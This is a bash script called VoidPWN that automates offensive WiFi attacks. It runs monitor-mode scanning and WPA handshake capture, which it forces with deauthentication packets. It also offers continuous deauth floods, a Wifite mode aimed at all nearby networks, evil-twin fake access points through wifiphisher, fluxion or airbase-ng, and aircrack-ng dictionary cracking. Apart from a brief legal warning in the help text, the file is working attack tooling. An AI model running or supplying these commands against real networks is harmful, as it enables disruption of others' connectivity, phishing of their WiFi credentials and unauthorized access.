#!/bin/bash

################################################################################
# VoidPWN - WiFi Attack Automation Script
# Description: Automated WiFi reconnaissance and attack tools
# Author: void0x11
# Usage: ./wifi_tools.sh [options]
################################################################################

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
INTERFACE="wlan1"
MONITOR_INTERFACE="${INTERFACE}mon"
OUTPUT_DIR="$HOME/VoidPWN/output/captures"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Banner
print_banner() {
    echo -e "${CYAN}"
    cat << "EOF"
    ╦ ╦┬┌─┐┬  ┌┬┐┌─┐┌─┐┬  ┌─┐
    ║║║│├┤ │   │ │ ││ ││  └─┐
    ╚╩╝┴└  ┴   ┴ └─┘└─┘┴─┘└─┘
EOF
    echo -e "${NC}"
}

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[✗]${NC} $1"; }

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root (use sudo)"
        exit 1
    fi
}

# Kill interfering processes
kill_processes() {
    log_info "Killing interfering processes..."
    airmon-ng check kill > /dev/null 2>&1
    log_success "Processes killed"
}

# Enable monitor mode
enable_monitor_mode() {
    log_info "Enabling monitor mode on $INTERFACE..."
    
    # Check if interface exists
    if ! iwconfig 2>/dev/null | grep -q "$INTERFACE"; then
        log_error "Interface $INTERFACE not found!"
        log_info "Available interfaces:"
        iwconfig 2>&1 | grep "IEEE 802.11" | awk '{print $1}'
        exit 1
    fi
    
    # Enable monitor mode
    airmon-ng start "$INTERFACE" > /dev/null 2>&1
    
    if iwconfig 2>/dev/null | grep -q "$MONITOR_INTERFACE"; then
        log_success "Monitor mode enabled on $MONITOR_INTERFACE"
    else
        log_error "Failed to enable monitor mode"
        exit 1
    fi
}

# Disable monitor mode
disable_monitor_mode() {
    log_info "Disabling monitor mode..."
    airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1
    systemctl restart NetworkManager
    log_success "Monitor mode disabled"
}

# Scan for networks
scan_networks() {
    enable_monitor_mode
    
    log_info "Scanning for WiFi networks..."
    log_warning "Press Ctrl+C to stop scanning"
    echo ""
    
    airodump-ng "$MONITOR_INTERFACE"
}

# Capture handshake
capture_handshake() {
    local bssid="$1"
    local channel="$2"
    local essid="$3"
    
    if [[ -z "$bssid" ]] || [[ -z "$channel" ]]; then
        log_error "Usage: $0 --handshake <BSSID> <CHANNEL> [ESSID]"
        exit 1
    fi
    
    enable_monitor_mode
    
    local output_file="$OUTPUT_DIR/handshake_$(date +%Y%m%d_%H%M%S)"
    
    log_info "Capturing handshake for $bssid on channel $channel"
    log_info "Output: $output_file"
    echo ""
    
    # Start capture in background
    airodump-ng -c "$channel" --bssid "$bssid" -w "$output_file" "$MONITOR_INTERFACE" &
    local airodump_pid=$!
    
    sleep 3
    
    # Send deauth packets
    log_info "Sending deauth packets..."
    aireplay-ng --deauth 10 -a "$bssid" "$MONITOR_INTERFACE"
    
    sleep 2
    kill $airodump_pid 2>/dev/null
    
    log_success "Capture complete: $output_file"
    log_info "Crack with: aircrack-ng -w <wordlist> ${output_file}-01.cap"
}

# Automated attack with Wifite
auto_attack() {
    enable_monitor_mode
    
    log_info "Starting automated WiFi attack with Wifite..."
    log_warning "This will target all nearby networks"
    echo ""
    
    wifite --kill \
           --dict "$WORDLIST" \
           --wpa \
           --no-wps \
           --interface "$MONITOR_INTERFACE"
}

# Deauth attack
deauth_attack() {
    local bssid="$1"
    local count="${2:-0}"  # 0 = continuous
    
    if [[ -z "$bssid" ]]; then
        log_error "Usage: $0 --deauth <BSSID> [COUNT]"
        exit 1
    fi
    
    enable_monitor_mode
    
    log_info "Sending deauth packets to $bssid"
    if [[ "$count" -eq 0 ]]; then
        log_warning "Continuous mode - Press Ctrl+C to stop"
    fi
    echo ""
    
    aireplay-ng --deauth "$count" -a "$bssid" "$MONITOR_INTERFACE"
}

# Evil Twin attack
evil_twin() {
    local ssid="$1"
    local channel="${2:-6}"
    
    if [[ -z "$ssid" ]]; then
        log_error "Usage: $0 --evil-twin <SSID> [CHANNEL]"
        exit 1
    fi
    
    log_info "Setting up Evil Twin attack for: $ssid"

    # Check for advanced tools first
    if command -v wifiphisher &> /dev/null; then
        log_info "Launching Wifiphisher for advanced Evil Twin attack..."
        # wifiphisher requires interactive mode usually, but we try to pass ESSID
        wifiphisher --essid "$ssid"
        return
    fi
    
    if [ -d "/opt/fluxion" ]; then
        log_info "Found Fluxion. Launching..."
        log_warning "Fluxion is interactive. Follow the on-screen prompts."
        cd /opt/fluxion && ./fluxion.sh
        return
    fi

    # Fallback to airbase-ng (Basic Soft AP)
    log_info "Advanced tools (wifiphisher/fluxion) not found."
    log_info "Starting Basic Evil Twin AP using airbase-ng..."
    
    enable_monitor_mode
    
    log_info "Broadcasting SSID: $ssid on channel $channel"
    log_warning "This creates a fake AP. Clients may connect, but won't have internet access"
    log_warning "without further IP checking/routing configuration."
    log_warning "Press Ctrl+C to stop"
    echo ""
    
    airbase-ng -e "$ssid" -c "$channel" "$MONITOR_INTERFACE"
}

# Crack captured handshake
crack_handshake() {
    local cap_file="$1"
    local wordlist="${2:-$WORDLIST}"
    
    if [[ -z "$cap_file" ]]; then
        log_error "Usage: $0 --crack <CAP_FILE> [WORDLIST]"
        exit 1
    fi
    
    if [[ ! -f "$cap_file" ]]; then
        log_error "File not found: $cap_file"
        exit 1
    fi
    
    log_info "Cracking handshake: $cap_file"
    log_info "Wordlist: $wordlist"
    echo ""
    
    aircrack-ng -w "$wordlist" "$cap_file"
}

# Show help
show_help() {
    cat << EOF
${CYAN}VoidPWN WiFi Tools${NC}

${YELLOW}Usage:${NC}
  sudo $0 [OPTION]

${YELLOW}Options:${NC}
  --scan                    Scan for WiFi networks
  --handshake <BSSID> <CH>  Capture WPA handshake
  --auto-attack             Automated attack with Wifite
  --deauth <BSSID> [COUNT]  Deauth attack (0=continuous)
  --evil-twin <SSID> [CH]   Create Evil Twin AP (uses wifiphisher/fluxion if available)
  --crack <FILE> [DICT]     Crack captured handshake
  --monitor-on              Enable monitor mode
  --monitor-off             Disable monitor mode
  --help                    Show this help

${YELLOW}Examples:${NC}
  sudo $0 --scan
  sudo $0 --handshake AA:BB:CC:DD:EE:FF 6
  sudo $0 --auto-attack
  sudo $0 --deauth AA:BB:CC:DD:EE:FF 10
  sudo $0 --evil-twin "Free WiFi" 6
  sudo $0 --crack ~/captures/handshake-01.cap

${YELLOW}Output Directory:${NC}
  $OUTPUT_DIR

${RED}Legal Warning:${NC}
  Only test networks you own or have explicit permission to test.
  Unauthorized access is illegal.

EOF
}

# Main
main() {
    print_banner
    check_root
    
    case "$1" in
        --scan)
            scan_networks
            ;;
        --handshake)
            capture_handshake "$2" "$3" "$4"
            ;;
        --auto-attack)
            auto_attack
            ;;
        --deauth)
            deauth_attack "$2" "$3"
            ;;
        --evil-twin)
            evil_twin "$2"
            ;;
        --crack)
            crack_handshake "$2" "$3"
            ;;
        --monitor-on)
            enable_monitor_mode
            ;;
        --monitor-off)
            disable_monitor_mode
            ;;
        --help|*)
            show_help
            ;;
    esac
}

# Cleanup on exit
trap 'log_warning "Interrupted"; disable_monitor_mode; exit 1' INT TERM

main "$@"
